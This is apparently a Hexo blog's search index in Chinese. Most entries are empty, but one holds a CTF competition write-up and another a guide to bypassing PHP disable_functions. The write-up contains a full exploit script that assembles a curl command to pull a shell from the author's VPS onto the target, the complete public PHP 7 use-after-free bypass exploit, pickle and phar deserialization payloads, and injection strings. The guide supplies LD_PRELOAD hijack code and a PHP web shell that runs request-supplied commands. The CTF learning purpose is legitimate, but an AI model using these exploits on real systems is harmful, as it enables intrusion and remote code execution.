<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>常用的网站</title>
      <link href="/posts/f364e7d6/"/>
      <url>/posts/f364e7d6/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tornado框架</title>
      <link href="/posts/11fc1d3/"/>
      <url>/posts/11fc1d3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jwt学习笔记</title>
      <link href="/posts/70fc8f0c/"/>
      <url>/posts/70fc8f0c/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>requests文档阅读笔记</title>
      <link href="/posts/bce54486/"/>
      <url>/posts/bce54486/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>战疫分享赛wp</title>
      <link href="/posts/2f3193b1/"/>
      <url>/posts/2f3193b1/</url>
      
        <content type="html"><![CDATA[<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p><a href="http://www.zip源码，审计之后看到两个很有意思的操作" target="_blank" rel="noopener">www.zip源码，审计之后看到两个很有意思的操作</a></p><p>根目录下的 <code>init.php</code>文件中</p><pre><code class="php">&lt;?php//初始化整个页面error_reporting(0);//lib.php包括一些常见的函数include &#39;lib.php&#39;;session_save_path(&#39;session&#39;);ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);session_start();</code></pre><p>但是在 <code>core</code> 目录下的 <code>init.php</code> 中</p><pre><code class="php">&lt;?php//初始化整个页面#error_reporting(0);//lib.php包括一些常见的函数include &#39;../lib.php&#39;;session_save_path(&#39;../session&#39;);ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();</code></pre><p>用了两种不同的session处理方式</p><p>所以提交一个签名为</p><pre><code>|O:4:&quot;info&quot;:1:{s:5:&quot;admin&quot;;i:1;}</code></pre><p>这样再访问 <code>profile.php</code> 的时候</p><pre><code class="php">&lt;?phperror_reporting(0);session_save_path(&#39;session&#39;);include &#39;lib.php&#39;;ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class info{    public $admin;    public $sign;    public function __construct()    {        $this-&gt;admin = $_SESSION[&#39;admin&#39;];        $this-&gt;sign = $_SESSION[&#39;sign&#39;];    }    public function __destruct()    {        echo $this-&gt;sign;        if ($this-&gt;admin === 1) {            redirect(&#39;./core/index.php&#39;);        }    }}$a = new info();?&gt;</code></pre><p>就会触发反序列化，然后进入 <code>core/index.php</code> 中</p><p><code>core/index.php</code> 的源代码</p><pre><code>&lt;?phprequire_once(&#39;./init.php&#39;);error_reporting(0);if (check_session($_SESSION)) {    #hint : core/clear.php    $sandbox = &#39;./sandbox/&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo $sandbox;    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_POST[&#39;url&#39;])) {        $url = $_POST[&#39;url&#39;];        if (filter_var($url, FILTER_VALIDATE_URL)) {            if (preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)) {                echo &quot;you are hacker&quot;;            } else {                $res = parse_url($url);                if (preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])) {                    $code = file_get_contents($url);                    if (strlen($code) &lt;= 4) {                        @exec($code);                    } else {                        echo &quot;try again&quot;;                    }                }            }        } else {            echo &quot;invalid url&quot;;        }    } else {        highlight_file(__FILE__);    }} else {    die(&#39;只有管理员才能看到我哟&#39;);}</code></pre><p>不准用 <code>data</code> 协议，并且解析到的host必须是 <code>127.0.0.1</code> 初看还挺像2019年的byteCTF，但是这里用到的是 <code>compress.zlib</code> 协议(学习了)</p><pre><code>compress.zlib://data:@127.0.0.1/baidu.com?,ls</code></pre><p>当然也可以用base64的方式</p><pre><code>compress.zlib://data:@127.0.0.1/plain;base64,</code></pre><p>之后需要绕过长度来执行命令，脚本就用队友的好了，不能弹shell，只能从vps上下载shell到靶机上</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import parsefrom requests import sessionimport base64import randoms = session()url = &quot;http://121.36.222.22:88/login.php&quot;s.post(url, data={&#39;name&#39;:&#39;pxypxy&#39;})url1 = &quot;http://121.36.222.22:88/?page=upload&quot;s.post(url1, data={&#39;sign&#39;:&#39;woc|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:4:&quot;ssss&quot;;}&#39;})url3 = &quot;http://121.36.222.22:88/core/index.php&quot;s.get(url3)ip = &#39;x.x.x.x&#39;ip = &#39;0x&#39; + &#39;&#39;.join([str(hex(int(i))[2:].zfill(2))for i in ip.split(&#39;.&#39;)])pos0 = &#39;y&#39;pos1 = &#39;d&#39;pos2 = &#39;s&#39;payload = [    &#39;&gt;dir&#39;,    &#39;&gt;%s\&gt;&#39; % pos0,    &#39;&gt;%st-&#39; % pos1,    &#39;&gt;sl&#39;,    &#39;*&gt;v&#39;,    &#39;&gt;rev&#39;,    &#39;*v&gt;%s&#39; % pos2,    &#39;&gt;p&#39;,    &#39;&gt;ph\\&#39;,    &#39;&gt;y.\\&#39;,    &#39;&gt;\&gt;\\&#39;,    &#39;&gt;%s\\&#39; % ip[8:10],    &#39;&gt;%s\\&#39; % ip[6:8],    &#39;&gt;%s\\&#39; % ip[4:6],    &#39;&gt;%s\\&#39; % ip[2:4],    &#39;&gt;%s\\&#39; % ip[0:2],    &#39;&gt;\ \\&#39;,    &#39;&gt;rl\\&#39;,    &#39;&gt;cu\\&#39;,    &#39;sh &#39; + pos2,    &#39;sh &#39; + pos0,]for i in payload:    data = {&#39;url&#39;:&#39;compress.zlib://data:@127.0.0.1/plain;base64,&#39;+base64.b64encode(i.encode()).decode()}    r = s.post(url3, data=data)    print(r.text)    print(data[&#39;url&#39;])    sleep(0.1)</code></pre><h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>分析</p><p>考点是pickle反序列化，过滤掉了  R 指令码，并且重写了 <code>find_class</code>：</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))</code></pre><p>这就禁止引用除了 <code>__main__</code> 之外的其他module，但是如果通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改</p><p>于是可以先引入 <code>__main__.secret</code> 这个module，然后把一个 dict 压入栈，内容是 <code>{&#39;name&#39;: &#39;xx&#39;, &#39;category&#39;: &#39;yyy&#39;}</code>,之后执行 build指令，改写 <code>__main__.secret.name</code> 和 <code>__main__.secret.category</code>,此时 <code>secret.name</code>和 <code>secret.category</code> 已经变成我们想要的内容</p><p>之后再压入一个正常的 Animal对象，name和category分别是 xx和yyy最后构造的pickle数据如下</p><pre><code>b&quot;\x80\x03c__main__\nsecret\n}(Vname\nVxx\nVcategory\nVyyy\nub0c__main__\nAnimal\n)\x81}(S&#39;name&#39;\nS&#39;xx&#39;\nS&#39;category&#39;\nS&#39;yyy&#39;\nub.&quot;</code></pre><p>编码为base64提交即可</p><pre><code>gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVnh4ClZjYXRlZ29yeQpWeXl5CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFMnbmFtZScKUyd4eCcKUydjYXRlZ29yeScKUyd5eXknCnViLg==</code></pre><h2 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h2><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">脚本</a></p><pre><code class="php">rddshell&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(&#39;/readflag&#39;);function pwn($cmd) {    global $abc, $helper, $backtrace;    class Vuln {        public $a;        public function __destruct() {             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4                $backtrace = debug_backtrace();            }        }    }    class Helper {        public $a, $b, $c, $d;    }    function str2ptr(&amp;$str, $p = 0, $s = 8) {        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) {            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        }        return $address;    }    function ptr2str($ptr, $m = 8) {        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) {            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        }        return $out;    }    function write(&amp;$str, $p, $v, $n = 8) {        $i = 0;        for($i = 0; $i &lt; $n; $i++) {            $str[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        }    }    function leak($addr, $p = 0, $s = 8) {        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }        return $leak;    }    function parse_elf($base) {        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) {            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            }        }        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    }    function get_basic_funcs($base, $elf) {        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) {            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # &#39;constant&#39; constant check                if($deref != 0x746e6174736e6f63)                    continue;            } else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # &#39;bin2hex&#39; constant check                if($deref != 0x786568326e6962)                    continue;            } else continue;            return $data_addr + $i * 8;        }    }    function get_binary_base($binary_leak) {        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) {            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) { # ELF header                return $addr;            }        }    }    function get_system($basic_funcs) {        $addr = $basic_funcs;        do {            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) { # system                return leak($addr + 8);            }            $addr += 0x20;        } while($f_entry != 0);        return false;    }    function trigger_uaf($arg) {        # str_shuffle prevents opcache string interning        $arg = str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln = new Vuln();        $vuln-&gt;a = $arg;    }    if(stristr(PHP_OS, &#39;WIN&#39;)) {        die(&#39;This PoC is for *nix systems only.&#39;);    }    $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) { };    if(strlen($abc) == 79 || strlen($abc) == 0) {        die(&quot;UAF failed&quot;);    }    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) {        die(&quot;Couldn&#39;t determine binary base address&quot;);    }    if(!($elf = parse_elf($base))) {        die(&quot;Couldn&#39;t parse ELF header&quot;);    }    if(!($basic_funcs = get_basic_funcs($base, $elf))) {        die(&quot;Couldn&#39;t get basic_functions address&quot;);    }    if(!($zif_system = get_system($basic_funcs))) {        die(&quot;Couldn&#39;t get zif_system address&quot;);    }    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) {        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    }    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();}</code></pre><p>上传到tmp目录就行了</p><p><img src="/posts/2f3193b1/1583803771844.png" alt></p><h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p><code>www.zip</code> 源码泄露(现在好多web题都喜欢这么搞了)</p><p>这题主要是对伪造mysql的考察，但是有一个坑点</p><p><img src="/posts/2f3193b1/1583812041964.png" alt></p><p>我们可以设置<code>option</code>为8，然后就启用<code>MYSQL_OPT_LOCAL_INFILE</code>了。</p><p><img src="/posts/2f3193b1/1583812118883.png" alt></p><p>之后构造一个POP链就行了，POP链不是很长</p><pre><code class="php">&lt;?phpclass Listfile{    public $file;    function __construct()    {        $this-&gt;file = &quot;;/readflag&quot;;    }}class Fileupload{    public $file;    function __construct()    {        $this-&gt;file = new Listfile();    }}$payload = new Fileupload();$exp = new Phar(&#39;yds.phar&#39;);$exp -&gt; startBuffering();$exp-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);$exp -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);$exp -&gt; setMetadata($payload);$exp -&gt; stopBuffering();</code></pre><p><img src="/posts/2f3193b1/0.png" alt></p><h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>这题估计是很多队伍都比较头疼的了，3月7日那天折腾了一下午直到晚上才有师傅做出来</p><p>源代码</p><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;head&#39;])&amp;&amp;isset($_GET[&#39;url&#39;])){    $begin = &quot;The number you want: &quot;;    extract($_GET);    if($head == &#39;&#39;){        die(&#39;Where is your head?&#39;);    }    if(preg_match(&#39;/[A-Za-z0-9]/i&#39;,$head)){        die(&#39;Head can\&#39;t be like this!&#39;);    }    if(preg_match(&#39;/log/i&#39;,$url)){        die(&#39;No No No&#39;);    }    if(preg_match(&#39;/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i&#39;,$url)){        die(&#39;Don\&#39;t use strange protocol!&#39;);    }    $funcname = $head.&#39;curl_init&#39;;    $ch = $funcname();    if($ch){        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        curl_close($ch);    }    else{        $output = &#39;rua&#39;;    }    echo sprintf($begin.&#39;%d&#39;,$output);}else{    show_source(__FILE__);}</code></pre><p>几个小trick</p><ul><li><code>$head = \</code> 这样拼接之后就是根命名空间</li><li>协议基本都被过滤干净了就只能用http协议</li><li><code>$begin= %s%</code></li><li>过滤了 <code>log</code>，我估计是出题人不想让你去读日志(因为后面发现可以读除了flag之外的任意文件)</li></ul><p>之后就扫内网，看到开放了8080端口</p><p><img src="/posts/2f3193b1/1583812423811.png" alt></p><p>这里的坑点就比较多了，首先需要知道vipcode</p><pre><code>?head=\&amp;url=http://127.0.0.1:8080/read/file={file.vip.__dict__}%26vipcode=0&amp;begin=%s%</code></pre><p><img src="/posts/2f3193b1/1583812448622.png" alt></p><p>然后读文件</p><pre><code>/?head=\&amp;url=http://127.0.0.1:8080/read/file=/app/base/vip.py%26vipcode=m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin=%s%</code></pre><p><img src="/posts/2f3193b1/1583812465323.png" alt></p><p><code>vip.py</code> </p><pre><code class="python">Welcome,dear vip! Here are what you want:The file you read is:/app/base/vip.pyThe content is:import randomimport stringvipcode = &#39;&#39;class vip:    def __init__(self):        global vipcode        if vipcode == &#39;&#39;:            vipcode = &#39;&#39;.join(random.sample(string.ascii_letters+string.digits, 48))            self.truevipcode = vipcode        else:            self.truevipcode = vipcode    def GetCode(self):        return self.truevipcodeOther files under the same folder:__pycache__ __init__.py vip.py readfile.py%d</code></pre><p><code>readfile.py</code></p><pre><code class="python">from .vip import vipimport reimport osclass File:    def __init__(self,file):        self.file = file    def __str__(self):        return self.file    def GetName(self):        return self.fileclass readfile():    def __str__(self):        filename = self.GetFileName()        if &#39;..&#39; in filename or &#39;proc&#39; in filename:            return &quot;quanbumuda&quot;        else:            try:                file = open(&quot;/tmp/&quot; + filename, &#39;r&#39;)                content = file.read()                file.close()                return content            except:                return &quot;error&quot;    def __init__(self, data):        if re.match(r&#39;file=.*?&amp;vipcode=.*?&#39;,data) != None:            data = data.split(&#39;&amp;&#39;)            data = {                data[0].split(&#39;=&#39;)[0]: data[0].split(&#39;=&#39;)[1],                data[1].split(&#39;=&#39;)[0]: data[1].split(&#39;=&#39;)[1]            }            if &#39;file&#39; in data.keys():                self.file = File(data[&#39;file&#39;])            if &#39;vipcode&#39; in data.keys():                self.vipcode = data[&#39;vipcode&#39;]            self.vip = vip()    def test(self):        if &#39;file&#39; not in dir(self) or &#39;vipcode&#39; not in dir(self) or &#39;vip&#39; not in dir(self):            return False        else:            return True    def isvip(self):        if self.vipcode == self.vip.GetCode():            return True        else:            return False    def GetFileName(self):        return self.file.GetName()current_folder_file = []class vipreadfile():    def __init__(self,readfile):        self.filename = readfile.GetFileName()        self.path = os.path.dirname(os.path.abspath(self.filename))        self.file = File(os.path.basename(os.path.abspath(self.filename)))        global current_folder_file        try:            current_folder_file = os.listdir(self.path)        except:            current_folder_file = current_folder_file    def __str__(self):        if &#39;fl4g&#39; in self.path:            return &#39;nonono,this folder is a secret!!!&#39;        else:            output = &#39;&#39;&#39;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&#39;&#39;&#39;            filepath = (self.path + &#39;/{vipfile}&#39;).format(vipfile=self.file)            output += filepath            output += &#39;\r\n\r\nThe content is:\r\n&#39;            try:                f = open(filepath,&#39;r&#39;)                content = f.read()                f.close()            except:                content = &#39;can\&#39;t read&#39;            output += content            output += &#39;\r\n\r\nOther files under the same folder:\r\n&#39;            output += &#39; &#39;.join(current_folder_file)            return output</code></pre><p>过滤掉了 <code>fl4g</code></p><p><img src="/posts/2f3193b1/0-1583812648124.png" alt></p><p>看到 <code>current_folder_file</code> 是 global 的</p><p>所以读一次根目录的文件，让<code>current_folder_file</code> 里面有 <code>fl4g</code></p><p><img src="/posts/2f3193b1/0-1583812681289.png" alt></p><pre><code>/?head=\&amp;url=http://localhost:8080/read/file=/{vipfile.__class__.GetName.__globals__[current_folder_file][21]}/flag%26vipcode=m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin=%s%</code></pre><p>或者这个</p><pre><code>http://121.37.179.47:1101/?head=\&amp;begin=%1$s&amp;url=http://127.0.0.1:8080/read/file={vipfile.__class__.__init__.__globals__[__name__][9]}l4g_1s_h3re_u_wi11_rua/flag%26vipcode=kWSRgrZO9VjAJzaHsIwqXEtfF5u6GxM0ov74le18hcNnUpd3</code></pre><h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>false注入</p><p><code>username=&#39;%&#39;1&amp;password=&#39;%&#39;1</code></p><p>即可</p><h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><h2 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行进阶</title>
      <link href="/posts/137d2c1/"/>
      <url>/posts/137d2c1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>绕过disable_function总结</title>
      <link href="/posts/1cc6bf70/"/>
      <url>/posts/1cc6bf70/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>有一部分CTF题目，当你拿到webshell，蚁剑连接上去之后，却不能执行系统命令，这就是要绕过 <code>disable_function</code> 了</p><p><img src="/posts/1cc6bf70/1583650697704.png" alt="、"></p><p>可以看到禁用了很多函数</p><pre><code>apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</code></pre><h2 id="LD-PRELOAD-劫持系统函数"><a href="#LD-PRELOAD-劫持系统函数" class="headerlink" title="LD_PRELOAD 劫持系统函数"></a>LD_PRELOAD 劫持系统函数</h2><blockquote><p>LD_PRELOAD 是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。</p></blockquote><p>所以我们就可以通过利用环境变量LD_PRELOAD劫持系统函数，让外部程序加载恶意的.so文件，达到执行系统命令的效果</p><p>例如：</p><pre><code>$ LD_PRELOAD=/path/to/my/malloc.so /bin/ls</code></pre><p>即在执行<code>ls</code>命令前，会先加载指定路径的<code>malloc.so</code>文件，如果这是一个恶意共享对象，那么可以执行任意操作。</p><p>我们可以通过<code>readelf</code>命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用<code>LD_PRELOAD</code>环境变量指定生成的对象，达到命令执行的目的。</p><h3 id="一个简单的劫持示例"><a href="#一个简单的劫持示例" class="headerlink" title="一个简单的劫持示例"></a>一个简单的劫持示例</h3><p><code>getpid.c</code> 的内容如下</p><pre><code class="C">#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;void payload(void){    system(&quot;echo &#39;pwned by getpid!&#39;&quot;);}pid_t getpid(void){    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){        return 0;    }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();    return 0;}</code></pre><p>我们在这里劫持了 <code>getpid</code> 函数，由于python运行的时候使用了 <code>getpid</code> 函数，所以可以通过 <code>LD_PRELODAD</code> 来执行任意命令</p><pre><code>gcc -shared -fPIC getpid.c -o getpid.soLD_PRELOAD=./getpid.so python</code></pre><p>执行效果</p><p><img src="/posts/1cc6bf70/1583651075354.png" alt></p><p>注意：因为通过设置<code>preload</code>劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时<code>unsetenv(&quot;LD_PRELOAD&quot;)</code>则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，</p><p>所以绕过php disable_function也就比较简单了</p><blockquote><p>php中的mail、error_log函数是通过调用系统中的sendmail命令实现的(其他类似php中的函数还有imap_mail、mb_send_mail<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">参考</a>)，sendmail二进制文件中使用了getuid库函数，这样我们可以覆盖getuid函数。</p></blockquote><p>写一个 <code>getuid</code> </p><pre><code class="C">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int  getuid() {const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }unsetenv(&quot;LD_PRELOAD&quot;);system(cmdline);}</code></pre><p><code>gcc -shared -fPIC geteuid.c -o getuid.so</code> 编译成动态链接库。</p><p>然后再写一个php文件，设置好 <code>EVIL_CMDLINE</code> 环境变量，同时需要执行 so 文件地址</p><pre><code class="php">&lt;?php    $cmd = $_REQUEST[&quot;cmd&quot;];    $out_path = $_REQUEST[&quot;outpath&quot;];    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);    $so_path = $_REQUEST[&quot;sopath&quot;];    putenv(&quot;LD_PRELOAD=&quot; . $so_path);    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;  ?&gt;</code></pre><h2 id="无需劫持函数绕过-disable-function"><a href="#无需劫持函数绕过-disable-function" class="headerlink" title="无需劫持函数绕过 disable_function"></a>无需劫持函数绕过 disable_function</h2><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?files=1&tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">下载地址</a></p><blockquote><p>GCC 有个 C 语言扩展修饰符<strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行<strong>attribute</strong>((constructor)) 修饰的函数。</p></blockquote><p>于是修改一下原来的共享链接库代码</p><pre><code class="C">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void getuid() {const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }unsetenv(&quot;LD_PRELOAD&quot;);system(cmdline);}</code></pre><blockquote><p>这意味着，我们只需要找到该php环境中存在执行系统命令的函数、且putenv函数未被禁用的情况下，就可以绕过disable_function。</p></blockquote><p>演示一下</p><pre><code class="C">#include &lt;unistd.h&gt;void payload(void){    system(&quot;echo &#39;pwned!&#39;&quot;);}__attribute__ ((__constructor__)) void exec(void){    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){        return;    }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();    return;}</code></pre><p><img src="/posts/1cc6bf70/1583651506472.png" alt></p><h2 id="php7绕过disable-funtion"><a href="#php7绕过disable-funtion" class="headerlink" title="php7绕过disable_funtion"></a>php7绕过disable_funtion</h2><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">脚本地址</a></p><h2 id="ctfhub题目"><a href="#ctfhub题目" class="headerlink" title="ctfhub题目"></a>ctfhub题目</h2><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>使用蚁剑连接之后，直接加载插件，之后生成一个 <code>.antproxy.php</code> ，选择这个文件连接即可(密码不变)</p><p><img src="/posts/1cc6bf70/1583651719652.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kylingit.com/blog/利用ld_preload绕过disbale_functions/" target="_blank" rel="noopener">https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</a></p><p><a href="https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD劫持系统函数.html" target="_blank" rel="noopener">https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0.html</a></p><p><a href="https://blog.szfszf.top/article/37/" target="_blank" rel="noopener">https://blog.szfszf.top/article/37/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络侦察实验</title>
      <link href="/posts/ea51772/"/>
      <url>/posts/ea51772/</url>
      
